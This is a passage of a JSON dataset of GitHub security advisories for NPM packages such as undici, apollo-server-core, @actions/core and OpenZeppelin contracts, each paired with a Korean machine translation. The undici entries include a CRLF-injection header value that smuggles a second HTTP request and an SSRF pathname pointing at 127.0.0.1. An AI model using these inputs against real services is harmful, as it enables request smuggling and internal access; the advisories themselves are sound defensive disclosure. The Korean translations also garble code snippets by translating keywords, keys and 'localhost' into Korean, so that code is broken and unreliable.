    "vulnerableVersionRange": "<= 1.8.9",
    "identifier": "1.8.10",
    "descriptionKR": "패키지 pg-native의 모든 버전; 패키지 libpq의 모든 버전은 애드온이 두 번째 인수를 배열로 캐스팅하려고 시도하고 실패할 때 서비스 거부(DoS)에 취약합니다. 이는 전달된 모든 비배열 인수에 대해 발생합니다. **참고:** pg-native는 npm의 libpq 라이브러리에 대한 단순한 바인딩이며, 여기에는 실제 C libpq 라이브러리에 대한 애드온 및 바인딩이 있습니다. 이는 pg-native에서 발견된 문제가 npm의 libpq에 전이적으로 영향을 미칠 수 있음을 의미합니다."
  },
  {
    "description": "### Impact\nOur library allows strings to be parsed as functions and stored as a specialized component, [`JsonFunctionValue`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/09a0ca97835b0834ad054563e2fddc6f22bc5d8c/src/components/JsonFunctionValue.js). To do this, Javascript's [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function was used to execute strings that begin with \"function\" as Javascript. This was an oversight that unfortunately allows arbitrary code to be executed if it exists as a value within the JSON structure being displayed. Given that this component may often be used to display data from arbitrary, untrusted sources, this is extremely dangerous.\n\nOne important note is that users who have defined a custom [`onSubmitValueParser`](https://github.com/oxyno-zeta/react-editable-json-tree/tree/09a0ca97835b0834ad054563e2fddc6f22bc5d8c#onsubmitvalueparser) callback prop on the [`JsonTree`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/09a0ca97835b0834ad054563e2fddc6f22bc5d8c/src/JsonTree.js) component should be ***unaffected***. This vulnerability exists in the default `onSubmitValueParser` prop which calls [`parse`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/master/src/utils/parse.js#L30).\n\n### Patches\nWe have decided on a two-pronged approach to patching this vulnerability:\n\n1. Create a patch update that adds a workaround **which is not enabled by default** to preserve backwards-compatibility\n2. On the next major update, **we will enable this workaround by default**\n\nThe workaround we have decided on is adding a prop to `JsonTree` called `allowFunctionEvaluation`. This prop will be set to `true` in v2.2.2, so you can upgrade without fear of losing backwards-compatibility.\n\nWe have also implemented additional security measures as we know many people may not read the details of this vulnerability, and we want to do the best we can to keep you protected. In v2.2.2, we switched from using `eval` to using [`Function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) to construct anonymous functions. This is better than `eval` for the following reasons:\n\n- Arbitrary code should not be able to execute immediately, since the `Function` constructor explicitly *only creates* anonymous functions\n- Functions are created without local closures, so they only have access to the global scope\n\nThis change has brought a *slight* potential for breaking backwards-compatibility if users for some reason were relying on side-effects of our usage of `eval`, but that is beyond intended behavior, so we have decided to go ahead with this change and consider it a non-breaking change.\n\n### Workarounds\nAs mentioned above, there are a few scenarios you must consider:\n\nIf you use:\n- **Version `<2.2.2`**, you must upgrade as soon as possible.\n- **Version `^2.2.2`**, you must explicitly set `JsonTree`'s `allowFunctionEvaluation` prop to `false` to fully mitigate this vulnerability.\n- **Version `>=3.0.0`**, `allowFunctionEvaluation` is already set to `false` by default, so no further steps are necessary.\n\n### References\nNone.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [GitHub repo](https://github.com/oxyno-zeta/react-editable-json-tree)\n",
    "identifiers": "GHSA : GHSA-j3rv-w43q-f9x2\nCVE : CVE-2022-36010",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:06:44Z",
    "publishedAt": "2022-08-18T19:15:28Z",
    "references": "https://github.com/oxyno-zeta/react-editable-json-tree/security/advisories/GHSA-j3rv-w43q-f9x2\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-36010\nhttps://github.com/oxyno-zeta/react-editable-json-tree/releases/tag/2.2.2\nhttps://github.com/advisories/GHSA-j3rv-w43q-f9x2",
    "name": "react-editable-json-tree",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.2",
    "identifier": "2.2.2",
    "descriptionKR": "### 영향\n당사의 라이브러리를 사용하면 문자열을 함수로 구문 분석하고 특수 구성 요소인 [`JsonFunctionValue`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/09a0ca97835b0834ad054563e2fddc6f22bc5d8c/src/components/)로 저장할 수 있습니다. JsonFunctionValue.js). 이를 위해 Javascript의 [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) 함수를 사용하여 \"function\"으로 시작하는 문자열을 다음과 같이 실행했습니다. 자바스크립트. 이는 불행히도 표시되는 JSON 구조 내에 값으로 존재하는 경우 임의의 코드가 실행되도록 허용하는 간과였습니다. 이 구성 요소는 임의의 신뢰할 수 없는 소스의 데이터를 표시하는 데 자주 사용될 수 있으므로 이는 매우 위험합니다.\n\n한 가지 중요한 점은 사용자 정의 [`onSubmitValueParser`](https://github.com/oxyno-zeta/react-editable-json-tree/tree/09a0ca97835b0834ad054563e2fddc6f22bc5d8c#onsubmitvalueparser) 콜백 소품을 [`JsonTree `](https://github.com/oxyno-zeta/react-editable-json-tree/blob/09a0ca97835b0834ad054563e2fddc6f22bc5d8c/src/JsonTree.js) 구성 요소는 ***영향을 받지 않음***이어야 합니다. 이 취약점은 [`parse`](https://github.com/oxyno-zeta/react-editable-json-tree/blob/master/src/utils/parse.js#를 호출하는 기본 `onSubmitValueParser` prop에 존재합니다.# L30).\n\n### 패치\n우리는 이 취약점을 패치하기 위해 두 갈래 접근 방식을 결정했습니다.\n\n1. 이전 버전과의 호환성을 유지하기 위해 **기본적으로 활성화되지 않은** 해결 방법을 추가하는 패치 업데이트를 만듭니다.\n2. 다음 주요 업데이트에서 **기본적으로 이 해결 방법을 활성화합니다**\n\n우리가 결정한 해결 방법은 `allowFunctionEvaluation`이라는 `JsonTree`에 소품을 추가하는 것입니다. 이 소품은 v2.2.2에서 'true'로 설정되므로 이전 버전과의 호환성을 잃을 염려 없이 업그레이드할 수 있습니다.\n\n또한 많은 사람들이 이 취약점에 대한 세부 정보를 읽지 않을 수 있음을 알고 추가 보안 조치를 구현했으며 귀하를 보호하기 위해 최선을 다하고 싶습니다. v2.2.2에서는 익명 함수를 생성하기 위해 `eval` 사용에서 [`Function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) 사용으로 전환했습니다. . 다음과 같은 이유로 `eval`보다 낫습니다.\n\n- 임의의 코드는 즉시 실행될 수 없어야 합니다. 왜냐하면 `Function` 생성자는 명시적으로 익명 함수를 *만 생성*하기 때문입니다.\n- 함수는 로컬 클로저 없이 생성되므로 전역 범위에만 액세스할 수 있습니다.\n\n이 변경으로 인해 사용자가 어떤 이유로든 'eval' 사용의 부작용에 의존하는 경우 이전 버전과의 호환성이 깨질 *약간의* 가능성이 있지만 이는 의도된 동작을 벗어나므로 이 변경을 진행하기로 결정했습니다. 주요 변경 사항이 아닌 것으로 간주합니다.\n\n### 해결 방법\n위에서 언급했듯이 고려해야 할 몇 가지 시나리오가 있습니다.\n\n다음을 사용하는 경우:\n- **버전 `<2.2.2`**, 가능한 한 빨리 업그레이드해야 합니다.\n- **버전 `^2.2.2`**, 이 취약점을 완전히 완화하려면 `JsonTree`의 `allowFunctionEvaluation` 소품을 `false`로 명시적으로 설정해야 합니다.\n- **버전 `>=3.0.0`**, `allowFunctionEvaluation`은 기본적으로 이미 `false`로 설정되어 있으므로 추가 단계가 필요하지 않습니다.\n\n### 참조\n없음.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [GitHub 저장소](https://github.com/oxyno-zeta/react-editable-json-tree)에서 이슈 열기"
  },
  {
    "description": "Renato v0.17.0 was discovered to contain a cross-site scripting (XSS) vulnerability. This issue is fixed in version 0.17.1.",
    "identifiers": "GHSA : GHSA-vc68-6x72-w22f\nCVE : CVE-2022-35144",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:06:06Z",
    "publishedAt": "2022-08-05T00:00:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-35144\nhttps://cwe.mitre.org/data/definitions/79.html\nhttps://gainsec.com/2022/08/04/cve-2022-35142-cve-2022-35143-cve-2022-35144/\nhttp://raneto.com/\nhttps://github.com/ryanlelek/Raneto/pull/370\nhttps://github.com/ryanlelek/Raneto/releases/tag/0.17.1\nhttps://github.com/advisories/GHSA-vc68-6x72-w22f",
    "name": "raneto",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.17.0",
    "identifier": "0.17.1",
    "descriptionKR": "Renato v0.17.0에는 XSS(교차 사이트 스크립팅) 취약점이 포함되어 있는 것으로 밝혀졌습니다. 이 문제는 버전 0.17.1에서 수정되었습니다."
  },
  {
    "description": "### Impact\n\n`=< undici@5.8.0` users are vulnerable to _CRLF Injection_ on headers when using unsanitized input as request headers, more specifically, inside the `content-type` header.\n\nExample:\n\n```\nimport { request } from 'undici'\n\nconst unsanitizedContentTypeInput =  'application/json\\r\\n\\r\\nGET /foo2 HTTP/1.1'\n\nawait request('http://localhost:3000, {\n    method: 'GET',\n    headers: {\n      'content-type': unsanitizedContentTypeInput\n    },\n})\n```\n\nThe above snippet will perform two requests in a single `request` API call:\n\n1) `http://localhost:3000/`\n2) `http://localhost:3000/foo2`\n\n### Patches\n\nThis issue was patched in Undici v5.8.1\n\n### Workarounds\n\nSanitize input when sending content-type headers using user input.\n\n## For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [undici repository](https://github.com/nodejs/undici/issues)\n- To make a report, follow the [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) document",
    "identifiers": "GHSA : GHSA-f772-66g8-q5h3\nCVE : CVE-2022-35948",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:04:25Z",
    "publishedAt": "2022-08-18T19:02:56Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-f772-66g8-q5h3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35948\nhttps://github.com/nodejs/undici/commit/66165d604fd0aee70a93ed5c44ad4cc2df395f80\nhttps://github.com/nodejs/undici/releases/tag/v5.8.2\nhttps://github.com/advisories/GHSA-f772-66g8-q5h3",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 5.8.1",
    "identifier": "5.8.2",
    "descriptionKR": "### 영향\n\n`=< undici@5.8.0` 사용자는 위생 처리되지 않은 입력을 요청 헤더로 사용할 때, 특히 `content-type` 헤더 내부에서 헤더에 대한 _CRLF 주입_에 취약합니다.\n\n예:\n\n```\n'undici'에서 { 요청 } 가져오기\n\nconst unsanitizedContentTypeInput = '응용 프로그램/json\\r\\n\\r\\nGET /foo2 HTTP/1.1'\n\n요청 대기('http://localhost:3000, {\n    메소드: 'GET',\n    헤더: {\n      '콘텐츠 유형': unsanitizedContentTypeInput\n    },\n})\n```\n\n위 스니펫은 단일 `request` API 호출에서 두 개의 요청을 수행합니다.\n\n1) `http://로컬호스트:3000/`\n2) `http://로컬호스트:3000/foo2`\n\n### 패치\n\n이 문제는 Undici v5.8.1에서 패치되었습니다.\n\n### 해결 방법\n\n사용자 입력을 사용하여 콘텐츠 유형 헤더를 보낼 때 입력을 삭제합니다.\n\n## 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [undici 저장소](https://github.com/nodejs/undici/issues)에서 이슈 열기\n- 신고는 [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) 문서를 따라주세요."
  },
  {
    "description": "## Impact\n\nThe `core.exportVariable` function uses a well known delimiter that attackers can use to break out of that specific variable and assign values to other arbitrary variables. Workflows that write untrusted values to the `GITHUB_ENV` file may cause the path or other environment variables to be modified without the intention of the workflow or action author.\n\n## Patches\n\nUsers should upgrade to `@actions/core v1.9.1`.\n\n## Workarounds\n\nIf you are unable to upgrade the `@actions/core` package, you can modify your action to ensure that any user input does not contain the delimiter `_GitHubActionsFileCommandDelimeter_` before calling `core.exportVariable`.\n\n## References\n\n[More information about setting-an-environment-variable in workflows](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-environment-variable)\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [`actions/toolkit`](https://github.com/actions/toolkit/issues)\n",
    "identifiers": "GHSA : GHSA-7r3h-m5j6-3q42\nCVE : CVE-2022-35954",
    "severity": "MODERATE",
    "updatedAt": "2023-01-30T05:06:59Z",
    "publishedAt": "2022-08-18T19:01:36Z",
    "references": "https://github.com/actions/toolkit/security/advisories/GHSA-7r3h-m5j6-3q42\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35954\nhttps://github.com/actions/toolkit/commit/4beda9cbc00ba6eefe387a937c21087ccb8ee9df\nhttps://github.com/advisories/GHSA-7r3h-m5j6-3q42",
    "name": "@actions/core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.9.0",
    "identifier": "1.9.1",
    "descriptionKR": "## 영향\n\n`core.exportVariable` 함수는 공격자가 특정 변수를 벗어나 다른 임의 변수에 값을 할당하는 데 사용할 수 있는 잘 알려진 구분 기호를 사용합니다. 신뢰할 수 없는 값을 `GITHUB_ENV` 파일에 쓰는 워크플로는 워크플로 또는 작업 작성자의 의도 없이 경로 또는 기타 환경 변수가 수정되도록 할 수 있습니다.\n\n## 패치\n\n사용자는 `@actions/core v1.9.1`로 업그레이드해야 합니다.\n\n## 해결 방법\n\n`@actions/core` 패키지를 업그레이드할 수 없는 경우 `core.exportVariable`을 호출하기 전에 사용자 입력에 구분 기호 `_GitHubActionsFileCommandDelimeter_`가 포함되지 않도록 조치를 수정할 수 있습니다.\n\n## 참조\n\n[워크플로의 환경 변수 설정에 대한 자세한 정보](https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#setting-an-environment-variable )\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [`actions/toolkit`](https://github.com/actions/toolkit/issues)에서 문제 열기"
  },
  {
    "description": "### Impact\n\nThe functions `ECDSA.recover` and `ECDSA.tryRecover` are vulnerable to a kind of signature malleability due to accepting EIP-2098 compact signatures in addition to the traditional 65 byte signature format. This is only an issue for the functions that take a single `bytes` argument, and not the functions that take `r, v, s` or `r, vs` as separate arguments.\n\nThe potentially affected contracts are those that implement signature reuse or replay protection by marking the signature itself as used rather than the signed message or a nonce included in it. A user may take a signature that has already been submitted, submit it again in a different form, and bypass this protection.\n\n### Patches\n\nThe issue has been patched in 4.7.3.\n\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).\n",
    "identifiers": "GHSA : GHSA-4h98-2769-gh6h\nCVE : CVE-2022-35961",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:07:36Z",
    "publishedAt": "2022-08-18T19:00:43Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35961\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/d693d89d99325f395182e4f547dbf5ff8e5c3c87\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.3\nhttps://github.com/advisories/GHSA-4h98-2769-gh6h",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.7.3",
    "identifier": "4.7.3",
    "descriptionKR": "### 영향\n\n'ECDSA.recover' 및 'ECDSA.tryRecover' 기능은 기존의 65바이트 서명 형식 외에 EIP-2098 압축 서명을 허용하기 때문에 일종의 서명 가단성에 취약합니다. 이것은 하나의 `bytes` 인수를 취하는 함수의 경우에만 문제이며 `r, v, s` 또는 `r, vs`를 별도의 인수로 취하는 함수가 아닙니다.\n\n잠재적으로 영향을 받는 계약은 서명된 메시지나 포함된 논스가 아닌 서명 자체를 사용된 것으로 표시하여 서명 재사용 또는 재생 보호를 구현하는 계약입니다. 사용자는 이미 제출된 서명을 받아 다른 형식으로 다시 제출하고 이 보호를 우회할 수 있습니다.\n\n### 패치\n\n이 문제는 4.7.3에서 패치되었습니다.\n\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\nThe functions `ECDSA.recover` and `ECDSA.tryRecover` are vulnerable to a kind of signature malleability due to accepting EIP-2098 compact signatures in addition to the traditional 65 byte signature format. This is only an issue for the functions that take a single `bytes` argument, and not the functions that take `r, v, s` or `r, vs` as separate arguments.\n\nThe potentially affected contracts are those that implement signature reuse or replay protection by marking the signature itself as used rather than the signed message or a nonce included in it. A user may take a signature that has already been submitted, submit it again in a different form, and bypass this protection.\n\n### Patches\n\nThe issue has been patched in 4.7.3.\n\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying a fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).\n",
    "identifiers": "GHSA : GHSA-4h98-2769-gh6h\nCVE : CVE-2022-35961",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:07:36Z",
    "publishedAt": "2022-08-18T19:00:43Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-4h98-2769-gh6h\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35961\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3610\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/d693d89d99325f395182e4f547dbf5ff8e5c3c87\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.3\nhttps://github.com/advisories/GHSA-4h98-2769-gh6h",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.7.3",
    "identifier": "4.7.3",
    "descriptionKR": "### 영향\n\n'ECDSA.recover' 및 'ECDSA.tryRecover' 기능은 기존의 65바이트 서명 형식 외에 EIP-2098 압축 서명을 허용하기 때문에 일종의 서명 가단성에 취약합니다. 이것은 하나의 `bytes` 인수를 취하는 함수의 경우에만 문제이며 `r, v, s` 또는 `r, vs`를 별도의 인수로 취하는 함수가 아닙니다.\n\n잠재적으로 영향을 받는 계약은 서명된 메시지나 포함된 논스가 아닌 서명 자체를 사용된 것으로 표시하여 서명 재사용 또는 재생 보호를 구현하는 계약입니다. 사용자는 이미 제출된 서명을 받아 다른 형식으로 다시 제출하고 이 보호를 우회할 수 있습니다.\n\n### 패치\n\n이 문제는 4.7.3에서 패치되었습니다.\n\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
    "description": "### Impact\n\n`undici` is vulnerable to SSRF (Server-side Request Forgery) when an application takes in **user input** into the `path/pathname` option of `undici.request`.\n\nIf a user specifies a URL such as `http://127.0.0.1` or `//127.0.0.1`\n\n```js\nconst undici = require(\"undici\")\nundici.request({origin: \"http://example.com\", pathname: \"//127.0.0.1\"})\n```\n\nInstead of processing the request as `http://example.org//127.0.0.1` (or `http://example.org/http://127.0.0.1` when `http://127.0.0.1 is used`), it actually processes the request as `http://127.0.0.1/` and sends it to `http://127.0.0.1`.\n\nIf a developer passes in user input into `path` parameter of `undici.request`, it can result in an _SSRF_ as they will assume that the hostname cannot change, when in actual fact it can change because the specified path parameter is combined with the base URL.\n\n### Patches\n\nThis issue was fixed in `undici@5.8.1`.\n\n### Workarounds\n\nThe best workaround is to validate user input before passing it to the `undici.request` call.\n\n## For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [undici repository](https://github.com/nodejs/undici/issues)\n- To make a report, follow the [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) document\n",
    "identifiers": "GHSA : GHSA-8qr4-xgw6-wmr3\nCVE : CVE-2022-35949",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:04:20Z",
    "publishedAt": "2022-08-18T18:59:46Z",
    "references": "https://github.com/nodejs/undici/security/advisories/GHSA-8qr4-xgw6-wmr3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35949\nhttps://github.com/nodejs/undici/commit/124f7ebf705366b2e1844dff721928d270f87895\nhttps://github.com/nodejs/undici/releases/tag/v5.8.2\nhttps://github.com/advisories/GHSA-8qr4-xgw6-wmr3",
    "name": "undici",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 5.8.1",
    "identifier": "5.8.2",
    "descriptionKR": "### 영향\n\n`undici`는 응용 프로그램이 `undici.request`의 `path/pathname` 옵션에 **사용자 입력**을 사용할 때 SSRF(Server-side Request Forgery)에 취약합니다.\n\n사용자가 `http://127.0.0.1` 또는 `//127.0.0.1`과 같은 URL을 지정하는 경우\n\n```js\nconst undici = 요구(\"undici\")\nundici.request({원본: \"http://example.com\", 경로 이름: \"//127.0.0.1\"})\n```\n\n요청을 `http://example.org//127.0.0.1`(또는 `http://127.0.0.1이 사용될 때 `http://example.org/http://127.0.0.1`)로 처리하는 대신 `) 실제로 요청을 `http://127.0.0.1/`로 처리하여 `http://127.0.0.1`로 보냅니다.\n\n개발자가 `undici.request`의 `path` 매개변수에 사용자 입력을 전달하면 호스트 이름이 변경될 수 없다고 가정하기 때문에 _SSRF_가 발생할 수 있습니다. 실제로는 지정된 경로 매개변수가 기본 URL.\n\n### 패치\n\n이 문제는 `undici@5.8.1`에서 수정되었습니다.\n\n### 해결 방법\n\n가장 좋은 해결 방법은 사용자 입력을 `undici.request` 호출에 전달하기 전에 유효성을 검사하는 것입니다.\n\n## 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n- [undici 저장소](https://github.com/nodejs/undici/issues)에서 이슈 열기\n- 신고는 [SECURITY](https://github.com/nodejs/node/blob/HEAD/SECURITY.md) 문서를 따라주세요."
  },
  {
    "description": "### Impact\n\nThe default landing page contained HTML to display a sample `curl` command which is made visible if the full landing page bundle could not be fetched from Apollo's CDN. The server's URL is directly interpolated into this command inside the browser from `window.location.href`. On some older browsers such as IE11, this value is not URI-encoded. On such browsers, opening a malicious URL pointing at an Apollo Router could cause execution of attacker-controlled JavaScript.\n\nThis only affects Apollo Server with the [default landing page](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/) enabled. Old browsers visiting your server may be affected if ANY of these apply:\n- You do not pass any landing page plugin to the `plugins` option of `new ApolloServer`.\n- You pass `ApolloServerPluginLandingPageLocalDefault()` or `ApolloServerPluginLandingPageProductionDefault()` to the `plugins` option of `new ApolloServer`.\n\nBrowsers visiting your server are NOT affected if ANY of these apply:\n- You pass `ApolloServerPluginLandingPageDisabled()` to the `plugins` option of `new ApolloServer`.\n- You pass `ApolloServerPluginLandingPageGraphQLPlayground()` to the `plugins` option of `new ApolloServer`.\n- You pass a custom plugin implementing the `renderLandingPage` hook to the `plugins` option of `new ApolloServer`.\n\nThis issue was introduced in v3.0.0 when the landing page feature was added.\n\n### Patches\nTo avoid this, the sample `curl` command has been removed in release 3.10.1.\n\n### Workarounds\n\nDisabling the landing page removes the possibility of exploit:\n\n```ts\nimport { ApolloServerPluginLandingPageDisabled } from 'apollo-server-core';\n\nnew ApolloServer({\n  plugins: [ApolloServerPluginLandingPageDisabled()],\n  // ...\n});\n```\n\n### See also\nA similar issue exists in the landing page of Apollo Router. See the corresponding [Apollo Router security advisory](https://github.com/apollographql/router/security/advisories/GHSA-p5q6-hhww-f999).\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Apollo Server repository](https://github.com/apollographql/apollo-server/)\n* Email us at [security@apollographql.com](mailto:security@apollographql.com)\n\n### Credits\n\nThis issue was discovered by Adrian Denkiewicz of [Doyensec](https://doyensec.com/research.html).",
    "identifiers": "GHSA : GHSA-2fvv-qxrq-7jq6",
    "severity": "MODERATE",
    "updatedAt": "2023-01-07T05:05:53Z",
    "publishedAt": "2022-08-18T18:55:01Z",
    "references": "https://github.com/apollographql/apollo-server/security/advisories/GHSA-2fvv-qxrq-7jq6\nhttps://github.com/apollographql/apollo-server/commit/68a439b6e3af9edc8a2480092f2d49f058be1e64\nhttps://github.com/advisories/GHSA-2fvv-qxrq-7jq6",
    "name": "apollo-server-core",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.10.1",
    "identifier": "3.10.1",
    "descriptionKR": "### 영향\n\n기본 랜딩 페이지에는 전체 랜딩 페이지 번들을 Apollo의 CDN에서 가져올 수 없는 경우 표시되는 샘플 `curl` 명령을 표시하는 HTML이 포함되어 있습니다. 서버의 URL은 `window.location.href`에서 브라우저 내부의 이 명령으로 직접 보간됩니다. IE11과 같은 일부 구형 브라우저에서는 이 값이 URI로 인코딩되지 않습니다. 이러한 브라우저에서 Apollo 라우터를 가리키는 악성 URL을 열면 공격자가 제어하는 ​​JavaScript가 실행될 수 있습니다.\n\n이는 [기본 랜딩 페이지](https://www.apollographql.com/docs/apollo-server/api/plugin/landing-pages/)가 활성화된 Apollo 서버에만 영향을 미칩니다. 서버를 방문하는 이전 브라우저는 다음 중 하나라도 해당되는 경우 영향을 받을 수 있습니다.\n- `new ApolloServer`의 `plugins` 옵션에 랜딩 페이지 플러그인을 전달하지 않습니다.\n- `ApolloServerPluginLandingPageLocalDefault()` 또는 `ApolloServerPluginLandingPageProductionDefault()`를 `new ApolloServer`의 `plugins` 옵션에 전달합니다.\n\n다음 중 하나라도 적용되는 경우 서버를 방문하는 브라우저는 영향을 받지 않습니다.\n- `ApolloServerPluginLandingPageDisabled()`를 `new ApolloServer`의 `plugins` 옵션에 전달합니다.\n- `ApolloServerPluginLandingPageGraphQLPlayground()`를 `new ApolloServer`의 `plugins` 옵션에 전달합니다.\n- `renderLandingPage` 후크를 구현하는 사용자 지정 플러그인을 `new ApolloServer`의 `plugins` 옵션에 전달합니다.\n\n이 문제는 랜딩 페이지 기능이 추가되었을 때 v3.0.0에서 도입되었습니다.\n\n### 패치\n이를 방지하기 위해 샘플 `curl` 명령이 릴리스 3.10.1에서 제거되었습니다.\n\n### 해결 방법\n\n방문 페이지를 비활성화하면 악용 가능성이 제거됩니다.\n\n```ts\nimport { ApolloServerPluginLandingPageDisabled } from 'apollo-server-core';\n\n새로운 ApolloServer({\n  플러그인: [ApolloServerPluginLandingPageDisabled()],\n  // ...\n});\n```\n\n### 또한보십시오\nApollo Router의 랜딩 페이지에도 비슷한 문제가 있습니다. 해당 [Apollo 라우터 보안 권고](https://github.com/apollographql/router/security/advisories/GHSA-p5q6-hhww-f999)를 참조하세요.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [Apollo 서버 저장소](https://github.com/apollographql/apollo-server/)에서 문제 열기\n* [security@apollographql.com](mailto:security@apollographql.com)으로 이메일을 보내주세요.\n\n### 크레딧\n\n이 문제는 [Doyensec](https://doyensec.com/research.html)의 Adrian Denkiewicz가 발견했습니다."
  },
  {
    "description": "### Impact\n\nThis issue concerns instances of Governor that use the module `GovernorVotesQuorumFraction`, a mechanism that determines quorum requirements as a percentage of the voting token's total supply. In affected instances, when a proposal is passed to lower the quorum requirement, past proposals may become executable if they had been defeated only due to lack of quorum, and the number of votes it received meets the new quorum requirement.\n\nAnalysis of instances on chain found only one proposal that met this condition, and we are actively monitoring for new occurrences of this particular issue.\n\n### Patches\n\nThis issue has been patched in v4.7.2.\n\n### Workarounds\n\nAvoid lowering quorum requirements if a past proposal was defeated for lack of quorum.\n\n### References\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561\n\n### For more information\n\nIf you have any questions or comments about this advisory, or need assistance deploying the fix, email us at [security@openzeppelin.com](mailto:security@openzeppelin.com).",
    "identifiers": "GHSA : GHSA-xrc4-737v-9q75\nCVE : CVE-2022-31198",
    "severity": "HIGH",
    "updatedAt": "2023-01-30T05:06:59Z",
    "publishedAt": "2022-08-18T18:48:41Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31198\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.7.2\nhttps://github.com/advisories/GHSA-xrc4-737v-9q75",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.7.2",
    "identifier": "4.7.2",
    "descriptionKR": "### 영향\n\n이 문제는 투표 토큰의 총 공급량의 백분율로 쿼럼 요구 사항을 결정하는 메커니즘인 'GovernorVotesQuorumFraction' 모듈을 사용하는 주지사의 인스턴스와 관련이 있습니다. 영향을 받는 경우, 정족수 요구 사항을 낮추기 위해 제안이 통과되면 과거 제안이 정족수 부족으로 인해 패배하고 받은 투표 수가 새로운 정족수 요구 사항을 충족하는 경우에만 실행 가능해질 수 있습니다.\n\n체인의 인스턴스를 분석한 결과 이 ​​조건을 충족하는 제안이 하나만 발견되었으며, 이 특정 문제가 새로 발생하는지 적극적으로 모니터링하고 있습니다.\n\n### 패치\n\n이 문제는 v4.7.2에서 패치되었습니다.\n\n### 해결 방법\n\n정족수 부족으로 과거 제안이 거부된 경우 정족수 요구 사항을 낮추지 마십시오.\n\n### 참조\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/pull/3561\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있거나 수정 사항을 배포하는 데 도움이 필요한 경우 [security@openzeppelin.com](mailto:security@openzeppelin.com)으로 이메일을 보내주십시오."
  },
  {
